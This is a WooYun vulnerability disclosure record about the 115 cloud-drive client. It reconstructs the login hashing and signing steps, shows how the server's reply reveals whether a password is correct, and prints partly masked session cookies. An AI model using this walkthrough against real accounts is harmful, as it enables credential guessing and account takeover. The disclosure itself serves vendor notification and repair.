{"id": 88405, "wybug_id": "wooyun-2016-0192844", "wybug_title": "115网盘存在被口令探测的漏洞                                      ", "wybug_corp": "115网盘", "wybug_author": "路人甲", "wybug_date": "2016-04-06 11:31", "wybug_open_date": "2016-07-05 11:40", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["口令探测", "伪认证", "登陆机制破解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-09：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-05：\t细节向公众公开  简要描述： 115网盘强制用户使用其客户端，但其客户端安全措施不够严密，可被第三方直接调用，存在被口令探测的漏洞 详细说明：  以下所作工作是基于对115浏览器**.**.**.**版本的调试而得出的。1.计算密码哈希的javascript函数代码如下，是从115网盘首页中提取出来的：\nfunction a(a) {    var b = a;    if (48 == a.length) {      a = a.split(\"\");      var c, d, e, f, g;      for (g = 0, c = 0, d = a.length; d > c; c++) {        g += parseInt(a[c], 16);      }      for (g = parseInt(a[0], 16) - g % 2 * 2, 0 > g && (g += 16), a[0] = g.toString(16), c = n.length - 1; c >= 0 && (a.reverse(), e = n[c], f = a[e], g = parseInt(f, 16), g = a.splice(e + g, 1), g[0] == a.pop()); c--) {        ;      }      return a.join(\"\");    }    return oofUtil.security.sha1(b);  };\n2.当前时间值：1459842815构造出以下字符串：abc@**.**.**.**1459842815调用chrome偏移2550函数，得到sign值：6b5d0c41752206b691b6fcc491d3597f构造出以下字符串：{\"GUID\":\"33f43f86bbe810a06738\",\"account\":\"abc@**.**.**.**\",\"device\":\"LENOVO-PC\",\"device_id\":\"000C29E9FB9E\",\"device_type\":\"windows\",\"disk_serial\":\"\",\"dk\":\"\",\"environment\":0,\"network\":\"5\",\"passwd\":\"40bd001563085f??????329ea1ff5c5ecbdbbeef\",\"sign\":\"6b5d0c41752206b691b6fcc491d3597f\",\"system_info\":\"242B4A463E9F042F649336A452649C79E0EB0719D4BEDF3F77\",\"time\":1459842815}***************1459842815构造出以下字符串：!@###@#1459842815DFDR@#@#!@###@#1459842815DFDR@#@#调用chrome偏移2550函数，得到入口值：0c04b537fc32a3be9d1d1754d883269c****************以************处字符串为参数，调用chrome偏移7950函数，得到postdata数据：TGe9ohgKdO9Fyovsa+XB30OoYSCwOXGO4RfM33xoJBFk3w96vMFx9rMxOB8HACGWopaI6WqSuj1AaNl74rfB6wfOZFGhV6xInuDozKEhnWYAmsL6xIzNAShMjR+vbb2IcUfT9MB+lwszKiXQlEPOKcAwHtRZr2i1aaHLDxaxCVMnb8dmxQHBcx+DL9M9QFX8y6bCrWmMGz5aOF/g3kB5PYwDM/9VS8e37u+AzZV0WLny6VWgfdi7A/ywFqKYagup/tMaYltT7f/KgIoWktQ1i9QgabsYnPpYDS0treJaBkngclx0jxgd7EkRhf58rCZtX5bGVjw1tgWFGpqMd02cvcsvkU2SHbDwmJYSJYYvnkpSfvsl7p/cnhg0swKAXrLubXWkwa174EdduSd4DPHD4FQc1U+XKnfTMjLvOabL7EBi3mGCVOu1lDy6oRGNMmmmJuv6UC9abVWoSL1WfQ6H4K58tkYHyycH8WSZdhKPIAPlUFc1crpRP+JyJVkC8j+GMibFrm1ozRht24vUZPADZiwt7ayzeZTvoEZbFh8JYGYxtSQGJWT9Kfoj3aLvUTNAwNwRZumJMLmFVrDN1oFSQepFuX2IhXIkHFHZUWZ/eVHgTVh8ZIkD5Mv9ERCCoKeNZxQJAliD3PJwooWRwNAijIoAJO7jByBFFKb05E4v5zo=14598428151459842815调用chrome偏移F5D0函数，得到入口值：1310431641524951713104316415249517再调用chrome偏移2550函数，得到nonce值：ec413b74fba8fbc295dde750875f9eb1构造以下字符串：115ec413b74fba8fbc295dde750875f9eb1abc@**.**.**.**1459842815115再调用chrome偏移2550函数，得到token值：b578abf9a8c3727e8346c80ec67f761a向115服务器发送POST数据，服务器响应如图2。此处的\n\"state\":true\n代表帐号密码正确，否则为\n\"state\":false\n。115网盘的口令探测即可从此下手。3.115网盘服务器返回以下字符串：eRUxTIyPekrY1rBO8xkG9Bj9MoFat9M80mwtbxmZR2oQ0UHrgRIMHmECfM+Lw/gThgmoyLC4vRba7O7qlzTgEQjNCTPyK6kp76tWfIHzT7D3tNmtx34GNrmURzsh2a6ofimIA/k2hwCuqBmxIxjD3g2qI298uKADE8k5H04dNV5jy1aGcnN8iqLOhEtLJbAWGINQOhCaC3JPZ3BMsBev8dL4qBbzr73738Z0BMhAMWIsEy77yfhBtYI/wZOoGSHekhnVoy2MOw8PUnLwtclkIbMPRzk9CfKcvnyf+a3h5Q3dGgBhq58KkkAp1oSzvlvoMwY7fqLWsxrdIZ1y39Q9x00TbCkWjCVo4JGOjd+cfCOlqz0j0jarHsv6CGmXyGB8NiZPHI8tszCBUkqLmvPUskBXHHZmWRjtQVdyrGOTluW8UvdSWSrq3BuO5se0mSUnpY2hqAQAz9ortxHOatKeHuv9+D5sKYdjIEdrr/sc8CqFA7SQgJ6DnIIlftLRUFbH利用chrome偏移7A10函数，对115网盘服务器返回的以上字符串进行解码，得到：{\"cookie\":{\"UID\":\"360???041_A1_1456735426\",\"CID\":\"60c500324cc74787ab151f712f9d9c77\",\"SEID\":\"8d2bc2a9559df43f2907b758c30d428389c81f36c6f065f6cea5e786ade1ebb4499a61776548f15b44db1aea2d71457a00c1000d8e22899ce9eca720\"},\"user_id\":360???041,\"email\":\"w?????0@1??.com\",\"mobile\":\"\"}向/app/user/info发送GET数据，得到115服务器响应如图3调用chrome偏移74A0函数，得到入口值：suW8oaN51pS1biJ7rgE4evX7wbO45qT0rjK6ohF3帐号ID字符串：360???041构造以下字符串：360???041suW8oaN51pS1biJ7rgE4evX7wbO45qT0rjK6ohF3利用chrome偏移2550函数，计算以上字符串的哈希值，得到cid入口：6bf901e3f7bd3ecd35a85c5961548f0e构造以下字符串：21a02ea24e6301da58195c3945fd79f96bf901e3f7bd3ecd35a85c5961548f0e再次调用chrome偏移2550函数，计算得到：1955870b6559a85848a1c49c73c7a191构造以下字符串：10ba9a7f7d727df4a0daa784c464fa6d1c119d7666420ad640d62b48906a097e94389255514796d935989d1de09f4436e9868451f37eb78a0fa9aed31955870b6559a85848a1c49c73c7a191计算出checkstring：-----------------85178482fff519ba3566b4a266cb3d96构造以下字符串：{\"seid\":\"10ba9a7f7d727df4a0daa784c464fa6d1c119d7666420ad640d62b48906a097e94389255514796d935989d1de09f4436e9868451f37eb78a0fa9aed3\",\"cid\":\"21a02ea24e6301da58195c3945fd79f9\",\"uid\":\"360???041\",\"check_string\":\"85178482fff519ba3566b4a266cb3d96\"}计算出：--------------oaN5rgE4biJ71pS1suW8wbO4ohF3rjK65qT0evX7ea67f5148b85d5e58e5eedde277d6c2f调用chrome偏移7EC0函数，得到16进制密文：3EEBC21ABBF1A8642F9EE60A74898782800B4D0D9B92733D7CC3A6161EBE582C7324201ACC19319B2A63FA5B481F7DC73FD93951974FF96E99C3CCA5EDA77D27C1AAE7CDA20E7D2F42FE8D1E190735B1918C3B0C7F63B67CF59B40701D41FFB73DA6050BF60F2DF24D2906230FDF2A1DAFDC4DBBE5A428DE3099499C4B1C801C988070D7DB5366AD2CB37ED57447FB5E753D6F61788913377B6C4DD445D7BAD893A479999DAF3C5BEF904C0211947DC4551724047E5B6E052F3A84BA8B9197EB00D427DC4480C081A27B4CFEC959BB8FA06FB410C30907A94641AA7AB5F4EF1D79EAB562C12EFD8530B5EC86CD750C5D再次调用chrome偏移5960函数，得到clientverify：PuvCGrvxqGQvnuYKdImHgoALTQ2bknM9fMOmFh6+WCxzJCAazBkxmypj+ltIH33HP9k5UZdP+W6Zw8yl7ad9J8Gq582iDn0vQv6NHhkHNbGRjDsMf2O2fPWbQHAdQf+3PaYFC/YPLfJNKQYjD98qHa/cTbvlpCjeMJlJnEscgByYgHDX21NmrSyzftV0R/tedT1vYXiJEzd7bE3URde62JOkeZmdrzxb75BMAhGUfcRVFyQEfltuBS86hLqLkZfrANQn3ESAwIGie0z+yVm7j6BvtBDDCQepRkGqerX07x156rViwS79hTC17IbNdQxd向/app/auth/check发送POST数据，通过服务器验证，如图4。记住Cookies，然后向**.**.**.**发送GET数据，即可以第三方浏览器访问115网盘。以下为115网盘收集的附加POST数据，限于篇幅，此处省略解释。ka.420165.2bd49340659c2edc2735ed258c1beebe09bb808bb87b7df5c9cbc7eeb379d0dd1459842815{\"act\":\"lo\",\"chn\":1,\"cid\":\"Intel(R) Core(TM) i3-4130 CPU @ 3.40GHz\",\"crc\":\"2bd49340659c2edc2735ed258c1beebe\",\"ext1\":\"3071.6M\",\"ext2\":\"\",\"lang\":\"en-US\",\"mid\":\"000C29E9FB9E\",\"os\":\"6.1\",\"res\":\"1024*768\",\"sid\":19,\"timestamp\":\"1459842815\",\"uid\":\"\",\"ver\":\"**.**.**.**\",\"verify_str\":\"09bb808bb87b7df5c9cbc7eeb379d0dd\"}AQEc4W3NxledqSR27wlqoB+anLTUzAmzt43XeOkv0eoCrUYima+14x9uSUrHmHFd3l9qVno8CGb5b4gG4rc4nJysbzu9NZkhLGa5vV2/ie8sF+vBlMGXY+VUgddO+JCeZi3Jd7TOM7ZmQS5lS3FLeBson25Y3rICejn3NSe+nauL3Kv52P6fnB/tWMQGEqCHqsEg1u5agEYShsJ9wWYo2rXh7BNbYMdBnOocMRcirqRpvrJm/kx1RHTas4kE7l2ZaLMaVykqYdqhe+fHZ4hiTqECWN/egrasvi5iRcg7MArjS5cwQznVLHLZAI1++3fdWLq/QHBHDflbLTgs6JCyiR2+QT2RNY35I3HUGHpFMpf5gec7kzjtn6JwCQHppVHhkcIhUWPS4oSsYzDU3azC/avwRcRnVh9/IeGkzeiUK3EaC5e8wVaMBuZQdmUp8LAINlHuM/a1YYReZYMXoAip0wBzcTgDoEKf+4sbUnYbOBddF4ntMLMW0/V9SFc5VasuQsxzXwExU0U0oTPi4Z03G7mVLTD2MrdaSk/yT1BUkpxGvUmUbtkYMkU5kILlvYSSUmcLaSZvLe3Xmj8NhhTtqhpy5vnGnm3Kum2d4/e4Bes2QgRe95oLMnT466vyCEXZD3KVjnucn7Wk9ktWmv6FafZreGKVkqCKTncje3EyQmGe8/Ofo6pycGBz8Ta+CymgRVqwq9IT/3l4PED0hdw8Dh33EUho7UhMGKhE3E6QHlYk7Sx9R6XnQ9RJdrCuKx/wf5rFA/K78TaH5pktaGnvm2bc/bQ9IJbWTYxf5Y1VdrcasV2YyvO3lEd6ia0R0cbbTSIhlZrIhVt3fFkc/+yoIAfcxYseR1PPx/JpKxNO1xEROn3uVW7bEQGqp78T6/261Chj+CO1nlOARoRR+/jvRtmSQ2vSxo5e0XalNo1MOpYtuHVT09sl4hGS6nRfl50TxQprMNzHsro6Ue/xoIrVKj1Jvo5ZDMF+vhPLo2eM1d5h/DOS2oZdy84v4FJCxKinkAXiCU2Z8hI+J3x1o2ZUsAfMlhYmHNjZcni4KExvTLCTyaAekt7lWDgVeuf2nWgrpBYdsn3chTbQE0rVGcat/w+qI3WgtRQWTKP0gAlV+Q0H6xZA/sur/jQQacFh6k1ccyUenQxSqZYHYtztfrzg+ZSD/5NKhKiJkJSHD+thjTZMvhVhDffjkL53owigskmnI4wuaT5hYc4YaNzABWnqgPcPc4KBcYc9YO8FXsc/Joptcw==   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  1.建议增加chrome.dll文件的安全强度2.建议将账户口令的验证放到后面几步   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-04-06 11:38 厂商回复： 感谢提交！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}